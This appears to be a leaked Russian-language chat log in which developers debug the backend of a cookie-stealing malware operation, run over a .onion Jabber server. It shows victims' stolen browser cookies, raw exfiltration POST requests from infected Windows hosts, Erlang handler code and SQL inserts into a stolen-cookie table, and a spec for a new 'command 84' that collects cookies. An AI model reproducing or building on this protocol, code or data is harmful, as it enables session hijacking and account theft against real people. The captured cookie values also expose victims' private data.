Timestamp	From	To	Message
2021-08-27 10:42:52.131343	ttrr	hof	уже не раз так было
2021-08-27 10:42:54.117002	ttrr	hof	выход - разбираться
2021-08-27 10:42:55.653199	ttrr	hof	по пути у нас прокладки
2021-08-27 10:42:59.529356	ttrr	hof	и наши, и чужие
2021-08-27 10:43:06.790781	ttrr	hof	они жонглируют заголовками
2021-08-27 10:43:16.183234	ttrr	hof	они имеют право перекодировать пакеты
2021-08-27 10:43:18.436578	ttrr	hof	отошел
2021-08-27 12:29:10.138537	ttrr	hof	я на живом сейчас экспериментирую
2021-08-27 13:47:25.490055	ttrr	hof	мне все равно пока ничего не ясно из файлов
2021-08-27 13:47:25.491159	ttrr	hof	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:47:25.491658	ttrr	hof	это бинарный поток который мне приходит ..
2021-08-27 13:47:25.491950	ttrr	hof	вот с первого байта
2021-08-27 13:47:25.492482	ttrr	hof	давайте поставлю nginx между клиентом и деро
2021-08-27 13:47:25.493170	ttrr	hof	поставь
2021-08-27 13:47:25.493529	ttrr	hof	и там может по логам что поймем
2021-08-27 13:47:25.494016	ttrr	hof	и пусть логирует все запросы ..
2021-08-27 13:47:25.494968	ttrr	hof	ок сейчас
2021-08-27 13:47:25.495564	ttrr	hof	запрос . тело . ответ
2021-08-27 13:47:25.495806	ttrr	hof	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:47:25.496391	ttrr	hof	а, драйвера не добавил сюда
2021-08-27 13:47:25.496892	ttrr	hof	нужен он?
2021-08-27 13:47:25.497510	ttrr	hof	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:47:25.498179	ttrr	hof	вот кто это генерит - тот и нужен ..
2021-08-27 13:47:25.498700	ttrr	hof	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:47:25.499244	ttrr	hof	и нужно указание - что в нем криво
2021-08-27 13:47:25.499965	ttrr	hof	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:47:25.500662	ttrr	hof	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:47:25.501180	ttrr	hof	подождем что дефендер скажет
2021-08-27 13:49:10.565391	hof	ttrr	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:10.568772	ttrr	hof	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:18.701161	hof	ttrr	их много
2021-08-27 13:49:18.702697	ttrr	hof	их много
2021-08-27 13:49:49.133562	ttrr	hof	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:50:18.924244	hof	ttrr	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:50:18.928522	ttrr	hof	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:51:08.920369	ttrr	hof	давайте поставлю nginx между клиентом и деро
2021-08-27 13:51:08.921231	ttrr	hof	поставь
2021-08-27 13:51:08.921755	ttrr	hof	и там может по логам что поймем
2021-08-27 13:51:08.922429	ttrr	hof	и пусть логирует все запросы ..
2021-08-27 13:51:08.922906	ttrr	hof	ок сейчас
2021-08-27 13:51:08.923388	ttrr	hof	запрос . тело . ответ
2021-08-27 13:51:08.923989	ttrr	hof	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:51:08.924512	ttrr	hof	а, драйвера не добавил сюда
2021-08-27 13:51:08.925129	ttrr	hof	нужен он?
2021-08-27 13:51:08.925942	ttrr	hof	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:51:08.926748	ttrr	hof	вот кто это генерит - тот и нужен ..
2021-08-27 13:51:08.927187	ttrr	hof	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:51:08.927559	ttrr	hof	и нужно указание - что в нем криво
2021-08-27 13:51:08.928262	ttrr	hof	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:51:08.929074	ttrr	hof	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:51:08.929567	ttrr	hof	подождем что дефендер скажет
2021-08-27 13:51:08.930349	ttrr	hof	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:51:08.930809	ttrr	hof	их много
2021-08-27 13:51:08.931531	ttrr	hof	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:51:08.932322	ttrr	hof	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:53:32.719441	hof	ttrr	и расчитывать на то, что данные будут невалидные
2021-08-27 13:53:32.721668	ttrr	hof	и расчитывать на то, что данные будут невалидные
2021-08-27 13:54:01.210491	hof	ttrr	их могут специально посылать
2021-08-27 13:54:01.215079	ttrr	hof	их могут специально посылать
2021-08-27 13:58:05.091199	ttrr	hof	ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю
2021-08-27 13:58:24.130101	ttrr	hof	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:26.262951	ttrr	hof	точнее без них
2021-08-27 13:58:29.821177	ttrr	hof	а там бинарный поток
2021-08-27 13:58:48.997967	ttrr	hof	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:59:02.543417	ttrr	hof	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:21.605865	ttrr	hof	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:40.082074	ttrr	hof	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 14:04:43.782224	ttrr	hof	нет
2021-08-27 14:04:57.491318	ttrr	hof	прокладки - роутеры, что приняли то и передали
2021-08-27 14:07:15.102970	ttrr	hof	отлучился
2021-08-27 14:09:00.008438	ttrr	hof	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:10.162721	ttrr	hof	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:16.335183	ttrr	hof	нужно подтверждение от тебя
2021-08-27 14:13:25.745196	ttrr	hof	я делаю нджинкс
2021-08-27 14:15:45.066483	ttrr	hof	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:51.255854	ttrr	hof	вот тот бинарный
2021-08-27 15:37:14.588796	ttrr	hof	вот тот бинарный
2021-08-27 15:37:14.590014	ttrr	hof	что значит послать до базы ?
2021-08-27 15:37:14.590622	ttrr	hof	@buza
2021-08-27 15:37:14.591368	ttrr	hof	не послать, а проследить
2021-08-27 15:37:14.592202	ttrr	hof	вот тебе пришел этот бинарный запрос
2021-08-27 15:37:14.592982	ttrr	hof	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 15:37:14.593687	ttrr	hof	раз так, он должен положить в базу данных новую запись
2021-08-27 15:37:14.594491	ttrr	hof	эту запись можно увидеть?
2021-08-27 15:37:14.595143	ttrr	hof	там больше нет ничего ..
2021-08-27 15:37:14.595814	ttrr	hof	ну т.е. до базы оно не доходит
2021-08-27 15:37:14.596864	ttrr	hof	ни первый ни второй?
2021-08-27 15:37:14.597738	ttrr	hof	просто в логи ничего не пишется
2021-08-27 15:37:14.598886	ttrr	hof	да
2021-08-27 15:37:14.599850	ttrr	hof	ну так может это и не мы?
2021-08-27 15:37:14.600847	ttrr	hof	может это боты поисковые и т.п ?
2021-08-27 15:37:14.602023	ttrr	hof	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 15:37:14.602668	ttrr	hof	все HTTP/2 QUIC и прочий модный кал
2021-08-27 15:37:14.603300	ttrr	hof	и запретить доступ к веб-серверу не с прокладки
2021-08-27 15:37:14.604233	ttrr	hof	нет не могу
2021-08-27 15:37:14.605268	ttrr	hof	говорю же там все как есть передает
2021-08-31 05:53:27.772288	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-31 08:20:34.376261	ttrr	hof	ну и ?
2021-08-31 08:20:44.478700	ttrr	hof	одному мне больше всез надо ?
2021-08-31 08:21:25.224722	ttrr	hof	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.170516	ttrr	hof	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.352878	ttrr	hof	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.072636	ttrr	hof	нету истории
2021-08-31 08:26:45.196868	ttrr	hof	ну так на чем остановились?
2021-08-31 08:27:19.304871	ttrr	hof	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.959280	ttrr	hof	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.225032	ttrr	hof	и размер запроса
2021-08-31 08:29:36.045925	ttrr	hof	а ты steller ?
2021-08-31 08:31:18.951717	ttrr	hof	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.543787	ttrr	hof	что именно?
2021-08-31 08:33:15.477739	ttrr	hof	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.142854	ttrr	hof	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.536183	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.852836	ttrr	hof	вот поля
2021-08-31 08:35:14.269607	ttrr	hof	разделитель |
2021-08-31 08:35:28.666532	ttrr	hof	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.674633	ttrr	hof	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.167311	ttrr	hof	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.753341	ttrr	hof	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.942687	ttrr	hof	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.180254	ttrr	hof	таковы требоания были
2021-08-31 08:40:40.545044	ttrr	hof	50000 это в миллисекундах
2021-08-31 08:43:47.771928	ttrr	hof	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.921466	hof	ttrr	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:02.926845	ttrr	hof	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.938590	hof	ttrr	403 ошибка формата данных?
2021-08-31 08:45:20.942205	ttrr	hof	403 ошибка формата данных?
2021-08-31 08:45:42.349963	hof	ttrr	просо 200 бывает без /1/ ?
2021-08-31 08:45:42.352264	ttrr	hof	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.769481	hof	ttrr	просто
2021-08-31 08:45:46.774282	ttrr	hof	просто
2021-08-31 08:46:17.066963	ttrr	hof	zulas:
2021-08-31 08:47:07.167796	hof	ttrr	зачем этот /1/ ?
2021-08-31 08:47:07.173807	ttrr	hof	зачем этот /1/ ?
2021-08-31 08:47:10.013185	ttrr	hof	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.138566	ttrr	hof	вот такие ошибки бывают
2021-08-31 08:47:22.019900	ttrr	hof	текст у вас отобразился ?
2021-08-31 08:47:31.375299	ttrr	hof	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.865736	hof	ttrr	отразился
2021-08-31 08:47:40.874229	ttrr	hof	отразился
2021-08-31 08:48:11.903631	hof	ttrr	200 бывает без /1/ ?
2021-08-31 08:48:11.909320	ttrr	hof	200 бывает без /1/ ?
2021-08-31 08:48:50.549177	ttrr	hof	по коду вроде не бывает
2021-08-31 08:48:57.438478	hof	ttrr	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:48:57.444719	ttrr	hof	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.642501	ttrr	hof	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.813880	ttrr	hof	это типа следующая команда для клиента
2021-08-31 08:49:29.555474	hof	ttrr	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:29.559042	ttrr	hof	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.934309	ttrr	hof	не бывает
2021-08-31 08:50:06.566951	hof	ttrr	ок, отлично
2021-08-31 08:50:06.571332	ttrr	hof	ок, отлично
2021-08-31 08:50:53.720942	ttrr	hof	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.472656	ttrr	hof	есть
2021-08-31 08:52:48.118924	ttrr	hof	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.521735	ttrr	hof	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
2021-08-31 08:58:38.143140	ttrr	hof	вот . не может басе64 декодировать
2021-08-31 08:58:42.755242	ttrr	hof	не знаю какое поле
2021-08-31 08:59:10.715282	ttrr	hof	крашей больше нет
2021-08-31 08:59:29.609113	ttrr	hof	всмысли тех что хттп2
2021-08-31 09:05:10.045531	ttrr	hof	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
2021-08-31 09:05:45.412223	ttrr	hof	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);

вот 4 поля декодируются только
2021-08-31 09:05:49.217317	ttrr	hof	надо все ?
2021-08-31 09:07:35.429061	ttrr	hof	Нужно домен ещё декодировать
2021-08-31 09:08:11.257811	ttrr	hof	ок .. добавил в новых версиях .
2021-08-31 09:09:24.731817	ttrr	hof	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}

есть еще такое
2021-08-31 09:09:32.433326	ttrr	hof	на УТФ-8 не походит кодировка
2021-08-31 09:09:59.456064	ttrr	hof	И ещё нужно 2 поля добавить в конец записи.
secure, httponly
Значения: 0 & 1
2021-08-31 09:10:00.421978	ttrr	hof	насколько я понимаю это про <<149,166,247>>
2021-08-31 09:10:26.179746	ttrr	hof	в таблицу колонки ?
2021-08-31 09:10:55.309437	ttrr	hof	Да, в запись поле, в таблицу колонки.
2021-08-31 09:11:43.258346	ttrr	hof	А юникод в каком поле не проходит?
2021-08-31 09:20:09.638111	ttrr	hof	,<<149,166,247>> я думаю вот это не может быть юникодом
2021-08-31 09:20:45.228376	ttrr	hof	юзернейм
2021-08-31 09:22:08.345587	ttrr	hof	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
А ты можешь в readme этот формат добавить + описание ошибок?
Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
2021-08-31 09:23:06.136343	ttrr	hof	формат чего ?
2021-08-31 09:23:49.264092	ttrr	hof	в каталог doc есть некоторое описалово
2021-08-31 09:23:54.886092	ttrr	hof	Кукисов, например. Ещё бы хорошо остальные данные проверить.
2021-08-31 09:24:07.889614	ttrr	hof	Там кукисы описаны?
2021-08-31 09:24:16.336606	ttrr	hof	какие кукисы ?
2021-08-31 09:24:39.286951	ttrr	hof	Куки, печенюшки
2021-08-31 09:24:57.066718	ttrr	hof	я понял что такое куки, но к чему ты это говоришь ?
2021-08-31 09:25:05.871493	ttrr	hof	1. Создать новую команду для получения данных куки. Например, код команды 84

2. Создать таблицу для хранения данных (псевдокод SQL):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. Обеспечить прием данных в следующем формате:
- простой текст, разделенный на строки.
Разделитель строк - может быть как UNIX, так и DOS.
Одна строка - одна запись.
Разделитель полей в записи - вертикальная черта |
Формат записи:

